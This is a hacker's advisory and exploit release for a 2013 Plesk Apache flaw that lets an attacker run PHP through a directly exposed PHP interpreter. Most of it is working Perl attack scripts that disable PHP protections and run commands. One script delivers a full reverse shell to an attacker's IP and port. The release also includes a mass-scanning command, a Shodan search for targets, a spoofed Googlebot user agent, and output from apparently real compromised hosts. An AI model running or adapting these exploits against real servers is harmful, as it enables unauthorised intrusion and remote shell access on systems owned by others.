@@ -1,0 +1,290 @@
+Plesk Apache zeroday / June 2013
+discovered & exploited by kingcope
+
+
+this Plesk configuration setting makes it possible:
+scriptAlias /phppath/ "/usr/bin/"
+Furthermore this is not cve-2012-1823 because the php interpreter is called directly.
+(no php file is called)
+
+Parallels Plesk Remote Exploit -- PHP Code Execution and therefore Command Execution
+Affected and tested: Plesk 9.5.4
+					 Plesk 9.3
+					 Plesk 9.2
+					 Plesk 9.0
+					 Plesk 8.6
+Discovered & Exploited by Kingcope / June 2013
+Affected and tested OS: RedHat, CentOS, Fedora
+Affected and tested Platforms: Linux i386, Linux x86_64
+Untested OS: Windows (php.exe?)
+Unaffected: 11.0.9 due to compiled in protection of PHP version
+Traces in /var/log/httpd/access_log: 192.168.74.142 - - [19/Mar/2013:18:59:41 +0100] "POST /%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%
+6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%
+62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%
+3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%6E HTTP/1.1" 200 203 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
+Shodanhq overview of Plesk on Linux:
+http://www.shodanhq.com/search?q=plesklin
+
+perl plesk-simple.pl <ip address>
+...
+...
+...
+OK
+Linux ip.unsecure.net 2.6.18-028stab101.1 #1 SMP Sun Jun 24
+ 19:50:48 MSD 2012 i686 i686 i386 GNU/Linux
+uid=48(apache) gid=48(apache) groups=48(apache),2521(psaserv)
+---
+./pnscan -w"GET /phppath/php HTTP/1.0\r\n\r\n" -r "500 Internal" 76.12.54.163/16 80
+perl plesk-simple.pl 76.12.81.206
+HTTP/1.1 200 OK
+Date: Sat, 16 Mar 2013 13:39:35 GMT
+Server: Apache/2.2.3 (CentOS)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+77
+Linux 114114.unsecureweb.com 2.6.18-308.24.1.el5 #1 SMP Tue Dec 4 17:43:34 E
+ST 2012 x86_64 x86_64 x86_64 GNU/Linux
+
+3e
+uid=48(apache) gid=48(apache) groups=48(apache),2521(psaserv)
+
+0
+
+perl plesk-simple-ssl.pl <ip> (use HTTPS because HTTP gave an internal server error)
+HTTP/1.1 200 OK
+Date: Tue, 19 Mar 2013 15:29:28 GMT
+Server: Apache/2.0.54 (Fedora)
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html
+
+3
+OK
+
+60
+Linux www.ucdavis.edu 2.6.17-1.2142_FC4 #1 Tue Jul 11 22:41:14 EDT 2006 i686 i686 i386 GNU/Linux
+
+4c
+uid=48(apache) gid=48(apache) groups=48(apache),500(webadmin),2522(psaserv)
+
+0
+
+
+
+use IO::Socket;
+use URI::Escape;
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                              PeerPort => 80,
+                              Proto    => 'tcp');
+$pwn = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("uname -a;id;"); ?>';
+$arguments = uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("allow_url_include=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("safe_mode=off","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("open_basedir=none","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
+			 uri_escape("-n","\0-\377");
+$path = uri_escape("phppath","\0-\377") . "/" . uri_escape("php","\0-\377");
+print $sock "POST /$path?$arguments HTTP/1.1\r\n"
+           ."Host: $ARGV[0]\r\n"
+           ."Content-Type: application/x-www-form-urlencoded\r\n"
+           ."Content-Length: ". length($pwn) ."\r\n\r\n" . $pwn;
+while(<$sock>) {
+        print;
+}
+
+use IO::Socket::SSL;
+use URI::Escape;
+$sock = IO::Socket::SSL->new(PeerAddr => $ARGV[0],
+                              PeerPort => 443,
+                              Proto    => 'tcp');
+$pwn = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("uname -a;id;"); ?>';
+$arguments = uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("allow_url_include=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("safe_mode=off","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("open_basedir=none","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
+			 uri_escape("-n","\0-\377");
+$path = uri_escape("phppath","\0-\377") . "/" . uri_escape("php","\0-\377");
+print $sock "POST /$path?$arguments HTTP/1.1\r\n"
+           ."Host: $ARGV[0]\r\n"
+           ."Content-Type: application/x-www-form-urlencoded\r\n"
+           ."Content-Length: ". length($pwn) ."\r\n\r\n" . $pwn;
+while(<$sock>) {
+        print;
+}
+#CentOS/Redhat Linux: yum install perl-IO-Socket-SSL.noarch
+
+###############################################################################################################
+
+plesk-simple-ssl.pl
+
+#plesk remote exploit by kingcope
+#all your base belongs to me :>
+use IO::Socket::SSL;
+use URI::Escape;
+$sock = IO::Socket::SSL->new(PeerAddr => $ARGV[0],
+                              PeerPort => 443,
+                              Proto    => 'tcp');
+$pwn = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("uname -a;id;"); ?>';
+$arguments = uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("allow_url_include=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("safe_mode=off","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("open_basedir=none","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
+			 uri_escape("-n","\0-\377");
+$path = uri_escape("phppath","\0-\377") . "/" . uri_escape("php","\0-\377");
+print $sock "POST /$path?$arguments HTTP/1.1\r\n"
+           ."Host: $ARGV[0]\r\n"
+           ."User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"           
+           ."Content-Type: application/x-www-form-urlencoded\r\n"
+           ."Content-Length: ". length($pwn) ."\r\n\r\n" . $pwn;
+while(<$sock>) {
+        print;
+}
+#CentOS/Redhat Linux: yum install perl-IO-Socket-SSL.noarch
+
+
+###############################################################################################################
+
+plesk-simple.pl
+
+
+#plesk remote exploit by kingcope
+#all your base belongs to me :>
+use IO::Socket;
+use URI::Escape;
+$sock = IO::Socket::INET->new(PeerAddr => $ARGV[0],
+                              PeerPort => 80,
+                              Proto    => 'tcp');
+$pwn = '<?php echo "Content-Type:text/html\r\n\r\n";echo "OK\n";system("uname -a;id;"); ?>';
+$arguments = uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("allow_url_include=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("safe_mode=off","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("suhosin.simulation=on","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("disable_functions=\"\"","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" . 
+			 uri_escape("open_basedir=none","\0-\377"). "+" .
+			 uri_escape("-d","\0-\377"). "+" .
+			 uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
+			 uri_escape("-n","\0-\377");
+$path = uri_escape("phppath","\0-\377") . "/" . uri_escape("php","\0-\377");
+print $sock "POST /$path?$arguments HTTP/1.1\r\n"
+           ."Host: $ARGV[0]\r\n"
+           ."User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n"
+           ."Content-Type: application/x-www-form-urlencoded\r\n"
+           ."Content-Length: ". length($pwn) ."\r\n\r\n" . $pwn;
+while(<$sock>) {
+        print;
+}
+
+
+###############################################################################################################
+
+plesk.pl
+
+#plesk remote exploit by kingcope
+#all your base belongs to me :>
+use IO::Socket;
+use IO::Socket::SSL;
+use URI::Escape;
+sub usage {
+ print "usage: $0 <target> <http/https> <local_ip> <local_port>\n";exit;
+}
+if (!defined($ARGV[3])){usage();}
+$target=$ARGV[0];
+$proto=$ARGV[1];
+if ($proto eq "http") {
+$sock = IO::Socket::INET->new(
+ PeerAddr => $ARGV[0],
+ PeerPort => 80,
+ Proto => 'tcp');
+}elsif ($proto eq "https") {
+$sock = IO::Socket::SSL->new(
+ PeerAddr => $ARGV[0],
+ PeerPort => 443,
+ Proto => 'tcp');
+}else {usage();}
+$lip=$ARGV[2];
+$lport=$ARGV[3];
+$pwn="<?php echo \"Content-Type: text/plain\r\n\r\n\";set_time_limit (0); \$VERSION = \"1.0\"; \$ip =
+'$lip';  \$port = $lport; \$chunk_size = 1400; \$write_a = null;
+\$error_a = null; \$shell = '/bin/sh -i'; \$daemon =
+0;\$debug = 0; if (function_exists('pcntl_fork')) { \$pid =
+pcntl_fork(); if (\$pid == -1) { printit(\"ERROR: Can't fork\");
+exit(1);} if (\$pid) { exit(0);} if (posix_setsid() == -1) {
+printit(\"Error: Can't setsid()\"); exit(1); } \$daemon = 1;} else {
+printit(\"WARNING: Failed to daemonise.  This is quite common and not
+fatal.\");}chdir(\"/\"); umask(0); \$sock = fsockopen(\$ip, \$port,
+\$errno, \$errstr, 30);if (!\$sock) { printit(\"\$errstr (\$errno)\");
+exit(1);} \$descriptorspec = array(0 => array(\"pipe\", \"r\"),1 =>
+array(\"pipe\", \"w\"), 2 => array(\"pipe\", \"w\"));\$process =
+proc_open(\$shell, \$descriptorspec, \$pipes);if
+(!is_resource(\$process)) { printit(\"ERROR: Can't spawn shell\");
+exit(1);}stream_set_blocking(\$pipes[0],
+0);stream_set_blocking(\$pipes[1], 0);stream_set_blocking(\$pipes[2],
+0);stream_set_blocking(\$sock, 0);while (1) {    if (feof(\$sock)) {
+printit(\"done.\"); break;} if
+(feof(\$pipes[1])) {printit(\"done.\");break;}\$read_a = array(\$sock, \$pipes[1],
+\$pipes[2]);\$num_changed_sockets = stream_select(\$read_a, \$write_a,
+\$error_a, null);if (in_array(\$sock, \$read_a)) {if (\$debug)
+printit(\"SOCK READ\");\$input = fread(\$sock,
+\$chunk_size);if(\$debug) printit(\"SOCK:
+\$input\");fwrite(\$pipes[0], \$input);}if (in_array(\$pipes[1],
+\$read_a)) {if (\$debug) printit(\"STDOUT READ\");\$input =
+fread(\$pipes[1], \$chunk_size);if (\$debug) printit(\"STDOUT:
+\$input\");fwrite(\$sock, \$input);}if (in_array(\$pipes[2],
+\$read_a)) {if (\$debug) printit(\"STDERR READ\");\$input =
+fread(\$pipes[2], \$chunk_size);    if (\$debug) printit(\"STDERR:
+\$input\");fwrite(\$sock,
+\$input);}}fclose(\$sock);fclose(\$pipes[0]);fclose(\$pipes[1]);fclose(\$pipes[2]);proc_close(\$process);function printit (\$string) {if (!\$daemon) {print
+\"\$string\n\";}}
+?>";
+$arguments=uri_escape("-d","\0-\377"). "+" .
+ uri_escape("allow_url_include=on","\0-\377"). "+" .
+ uri_escape("-d","\0-\377"). "+" .
+ uri_escape("safe_mode=off","\0-\377"). "+" .
+ uri_escape("-d","\0-\377"). "+" .
+ uri_escape("suhosin.simulation=on","\0-\377"). "+" .
+ uri_escape("-d","\0-\377"). "+" .
+ uri_escape("disable_functions=\"\"","\0-\377"). "+" .
+ uri_escape("-d","\0-\377"). "+" .
+ uri_escape("open_basedir=none","\0-\377"). "+" .
+ uri_escape("-d","\0-\377"). "+" .
+ uri_escape("auto_prepend_file=php://input","\0-\377"). "+" .
+ uri_escape("-n","\0-\377");
+$path=uri_escape("phppath","\0-\377"). "/" . uri_escape("php","\0-\377");
+print $sock "POST /$path?$arguments HTTP/1.1\r\n".
+ "Host: $ARGV[0]\r\n".
+ "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\r\n".
+ "Content-Type: text/plain\r\n".
+ "Content-Length: ". length($pwn) ."\r\n\r\n". $pwn;
+while(<$sock>){print $_;};
+
+
+###############################################################################################################
